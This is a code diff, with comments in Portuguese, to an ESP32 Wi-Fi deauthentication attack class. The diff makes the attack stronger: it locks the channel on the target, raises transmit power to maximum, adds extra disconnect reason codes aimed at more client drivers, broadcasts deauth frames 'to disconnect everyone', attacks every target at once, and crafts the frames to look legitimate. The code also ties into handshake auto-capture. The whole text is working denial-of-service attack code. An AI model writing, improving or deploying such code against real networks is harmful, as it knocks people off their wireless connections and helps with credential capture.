@@ -5,6 +5,9 @@
 #include "../utils/logger.h"
 #include "../config.h"
 
+// Forward declaration para lockChannel sem include circular
+class Sniffer;
+
 class Deauther {
 public:
     static Deauther& get() { static Deauther inst; return inst; }
@@ -29,6 +32,12 @@ public:
     std::vector<Target> multiTargets;
     bool multiMode = false;
 
+    // Chamado pelo main após sniffer estar disponível
+    using LockChannelFn = void(*)(uint8_t ch);
+    using ResumeHopFn   = void(*)();
+    LockChannelFn fnLockChannel = nullptr;
+    ResumeHopFn   fnResumeHop   = nullptr;
+
     void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false) {
         memcpy(targetAP, ap, 6);
         if (client) memcpy(targetClient, client, 6);
@@ -39,6 +48,10 @@ public:
         framesSent    = 0;
         multiMode     = false;
         running       = true;
+        // Trava sniffer no canal do alvo para não interromper deauth
+        if (fnLockChannel) fnLockChannel(ch);
+        // Potência máxima (~20 dBm)
+        esp_wifi_set_max_tx_power(84);
         LOG.warn("[DEAUTH] " + bssidStr(ap) +
                  (broadcastMode ? " -> BROADCAST" : " -> " + bssidStr(client)) +
                  " ch" + String(ch) + (autoC ? " [AUTO-CAPTURE]" : ""));
@@ -49,6 +62,7 @@ public:
         multiMode    = true;
         framesSent   = 0;
         running      = true;
+        esp_wifi_set_max_tx_power(84);
         LOG.warn("[DEAUTH MULTI] " + String(targets.size()) + " alvos simultâneos");
     }
 
@@ -65,6 +79,8 @@ public:
         autoCapture = false;
         multiMode   = false;
         multiTargets.clear();
+        if (fnResumeHop) fnResumeHop();
+        esp_wifi_set_max_tx_power(78); // volta ao padrão ~19.5 dBm
         LOG.info("[DEAUTH] Parado. Frames enviados: " + String(framesSent));
     }
 
@@ -82,6 +98,8 @@ public:
 
 private:
     static const uint8_t _reasons[];
+    // Razões extras para cobrir mais drivers de clientes
+    static const uint8_t _reasons2[];
 
     int _burstSize() const {
         if (intensity == 0) return DEAUTH_BURST_SOFT;
@@ -91,48 +109,62 @@ private:
 
     void _tickSingle() {
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
         int burst = _burstSize();
         for (int i = 0; i < burst; i++) {
-            _sendFrame(targetAP, targetClient, _reasons[i % 8], 0xC0, i);
-            _sendFrame(targetAP, targetClient, 0x08, 0xA0, i);
-            framesSent += 2;
+            uint8_t reason  = _reasons[i % 8];
+            uint8_t reason2 = _reasons2[i % 8];
+            // Deauth AP→Cliente e Cliente→AP
+            _sendFrame(targetAP, targetClient, reason,  0xC0);
+            _sendFrame(targetAP, targetClient, reason2, 0xA0); // disassoc
+            // Broadcast independente do modo para desconectar todos
+            if (!broadcastMode) {
+                _sendFrame(targetAP, bcast, reason, 0xC0);
+            }
+            framesSent += broadcastMode ? 2 : 3;
         }
     }
 
     void _tickMulti() {
-        static size_t idx = 0;
         if (multiTargets.empty()) return;
-        const Target& t = multiTargets[idx % multiTargets.size()];
-        esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
-        int burst = max(4, _burstSize() / (int)multiTargets.size());
-        for (int i = 0; i < burst; i++) {
-            _sendFrame(t.ap, t.client, _reasons[i % 8], 0xC0, i);
-            _sendFrame(t.ap, t.client, 0x08, 0xA0, i);
-            framesSent += 2;
+        int burst = _burstSize();
+        // Ataca TODOS os alvos por tick (não apenas round-robin)
+        for (auto& t : multiTargets) {
+            esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
+            // Burst dividido por canal mas mínimo 16
+            int b = max(16, burst / (int)multiTargets.size());
+            for (int i = 0; i < b; i++) {
+                _sendFrame(t.ap, t.client, _reasons[i % 8],  0xC0);
+                _sendFrame(t.ap, t.client, _reasons2[i % 8], 0xA0);
+                framesSent += 2;
+            }
         }
-        idx++;
     }
 
-    void _sendFrame(const uint8_t* ap, const uint8_t* client, uint8_t reason, uint8_t fc0, int seq = 0) {
+    void _sendFrame(const uint8_t* ap, const uint8_t* client, uint8_t reason, uint8_t fc0) {
         uint8_t f[26] = {};
         f[0] = fc0; f[1] = 0x00;
-        // Sequence control: incrementa para parecer tráfego legítimo
-        f[22] = (uint8_t)((seq & 0x0F) << 4);
-        f[23] = (uint8_t)(seq >> 4);
+        // Duration: 0x013A = 314µs (valor real para management frames)
+        f[2] = 0x3A; f[3] = 0x01;
         f[24] = reason;
-        // AP → Client
+        // AP → Client: driver gerencia sequence number (en_sys_seq=true)
         memcpy(f + 4,  client, 6);
         memcpy(f + 10, ap, 6);
         memcpy(f + 16, ap, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
         // Client → AP
         memcpy(f + 4,  ap, 6);
         memcpy(f + 10, client, 6);
         memcpy(f + 16, ap, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
     }
 };
 
 inline const uint8_t Deauther::_reasons[] = {
     0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x09, 0x0E
+};
+
+// Conjunto complementar de razões para disassoc/segundo round de deauth
+inline const uint8_t Deauther::_reasons2[] = {
+    0x05, 0x06, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14
 };
